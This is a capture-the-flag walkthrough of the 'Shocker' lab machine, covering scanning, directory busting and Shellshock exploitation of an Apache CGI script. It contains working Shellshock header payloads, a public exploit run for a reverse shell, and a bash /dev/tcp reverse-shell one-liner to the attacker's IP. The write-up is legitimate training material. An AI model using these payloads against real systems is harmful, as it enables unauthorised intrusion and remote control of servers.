# Shocker

Apache
Penetration Tester Level 1
Web
Vulnerability Assessment
Outdated Software
Security Tools
Metasploit
Bash
Perl
Reconnaissance
Web Site Structure Discovery
SUDO Exploitation
Remote Code Execution

## Scanning

### Ping

First we ping the machine to check that we have access to it.

```
$ ping 10.10.10.56
PING 10.10.10.56 (10.10.10.56) 56(84) bytes of data.
64 bytes from 10.10.10.56: icmp_seq=1 ttl=63 time=47.0 ms
```

With the ping we can see that we the machine is recheable.
We can have some info about ttl=63.
This ttl means that we are in fton of a linux machine (ttl of linux is 64)

### Nmap

```
$ nmap -sC -sV -Pn -o nmap.txt 10.10.10.56
Nmap scan report for 10.10.10.56
Host is up (0.075s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4f8ade8f80477decf150d630a187e49 (RSA)
|   256 228fb197bf0f1708fc7e2c8fe9773a48 (ECDSA)
|_  256 e6ac27a3b5a9f1123c34a55d5beb3de9 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

We can see next avalible services:
- Ssh on port 2222, OpenSSH 7.2, this is a recent version of ssh. so It's shouldn't be vulnerable.
- Apache running on port 80. Navigating to this url, we can see a simpel image, nothing else. With wappalyzer tool, Apache 2.4.18 and php is being used. 

### Directory busting

We don't know what this server has accesible, just the main page with the image, that is useless for a potential penetration.

Directory busting helps to discover files and directories that the server has. This time dirb tool will be used.

```
$ dirb http://10.10.10.56 /usr/share/dirb/wordlists/small.txt

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Fri Dec  9 04:56:14 2022
URL_BASE: http://10.10.10.56/
WORDLIST_FILES: /usr/share/dirb/wordlists/small.txt

-----------------

GENERATED WORDS: 959                                                           

---- Scanning URL: http://10.10.10.56/ ----
+ http://10.10.10.56/cgi-bin/ (CODE:403|SIZE:294)                                                                                                          
                                                                                                                                                           
-----------------
END_TIME: Fri Dec  9 04:57:00 2022
DOWNLOADED: 959 - FOUND: 1
```

A directory /cgi-bin/ had been found. I don`t know for what tool is this used, let's google about it. Here we have a good reference:
- https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/cgi

There are some example to test if the server is vulnerable, but a file inside this directory is needed. This folder is commonly used to save scripts.
What scripts languages can be used? Perl (.pl), Python (.py), cgi scripts (.cgi) and shell scripts (.sh). Can be more, but let's start with this.

```
$ dirb http://10.10.10.56/cgi-bin/ /usr/share/dirb/wordlists/small.txt -X ".sh,.py,.pl,.cgi"

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Fri Dec  9 05:34:38 2022
URL_BASE: http://10.10.10.56/cgi-bin/
WORDLIST_FILES: /usr/share/dirb/wordlists/small.txt
EXTENSIONS_LIST: (.sh,.py,.pl,.cgi) | (.sh)(.py)(.pl)(.cgi) [NUM = 4]

-----------------

GENERATED WORDS: 959                                                           

---- Scanning URL: http://10.10.10.56/cgi-bin/ ----
+ http://10.10.10.56/cgi-bin/user.sh (CODE:200|SIZE:118)                                                                                                   
                                                                                                                                                           
-----------------
END_TIME: Fri Dec  9 05:37:44 2022
DOWNLOADED: 3836 - FOUND: 1
```

A file has been found on http://10.10.10.56/cgi-bin/user.sh 
This file content has nothing important.

Now we are ready to test if the server is vulnerable.
The first example doesn`t worked this time, but the second one, makes the response to be delayed 5 seconds, add some seconds, for example to 15 to be sure this is workign properly.

```
# Reflected
$ curl -H 'User-Agent: () { :; }; echo "VULNERABLE TO SHELLSHOCK"' http://10.10.10.56/cgi-bin/user.sh 2>/dev/null| grep 'VULNERABLE'

# Blind with sleep 
$ curl -H 'User-Agent: () { :; }; /bin/bash -c "sleep 5"' http://10.10.10.56/cgi-bin/user.sh
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>500 Internal Server Error</title>
</head><body>
<h1>Internal Server Error</h1>
<p>The server encountered an internal error or
misconfiguration and was unable to complete
your request.</p>
<p>Please contact the server administrator at 
 webmaster@localhost to inform them of the time this error occurred,
 and the actions you performed just before this error.</p>
<p>More information about this error may be available
in the server error log.</p>
<hr>
<address>Apache/2.4.18 (Ubuntu) Server at 10.10.10.56 Port 80</address>
</body></html>

```

## Gaining System Access - ShellShock

Let's start searching for an exploit.

```
$ searchsploit apache cgi
Apache mod_cgi - 'Shellshock' Remote Command Injection       | linux/remote/34900.py

$ python2 /usr/share/exploitdb/exploits/linux/remote/34900.py


                Shellshock apache mod_cgi remote exploit

Usage:
./exploit.py var=<value>

Vars:
rhost: victim host
rport: victim port for TCP shell binding
lhost: attacker host for TCP shell reversing
lport: attacker port for TCP shell reversing
pages:  specific cgi vulnerable pages (separated by comma)
proxy: host:port proxy

Payloads:
"reverse" (unix unversal) TCP reverse shell (Requires: rhost, lhost, lport)
"bind" (uses non-bsd netcat) TCP bind shell (Requires: rhost, rport)

Example:

./exploit.py payload=reverse rhost=1.2.3.4 lhost=5.6.7.8 lport=1234
./exploit.py payload=bind rhost=1.2.3.4 rport=1234

Credits:

Federico Galatolo 2014

$ python2 /usr/share/exploitdb/exploits/linux/remote/34900.py payload=reverse rhost=10.10.10.56 rport=80 lhost=10.10.16.4 lport=4445 pages=/cgi-bin/user.sh 
[!] Started reverse shell handler
[-] Trying exploit on : /cgi-bin/user.sh
[!] Successfully exploited
[!] Incoming connection from 10.10.10.56
10.10.10.56> whoami
shelly
```

We got the access to the machine. But the shell is not interactive at all, let's upgrade it.
This time we will use rlwrap that gives a more interactive shell.

On our local machine we let a port waitting.
```
$ rlwrap nc -lvnp 8888
```

And in the remote machine we run the next command to connect to the opened port.
If we don't know how to generate a reverse shell, this web is usefull https://www.revshells.com/
```
sh -i >& /dev/tcp/10.10.16.4/8888 0>&1
```



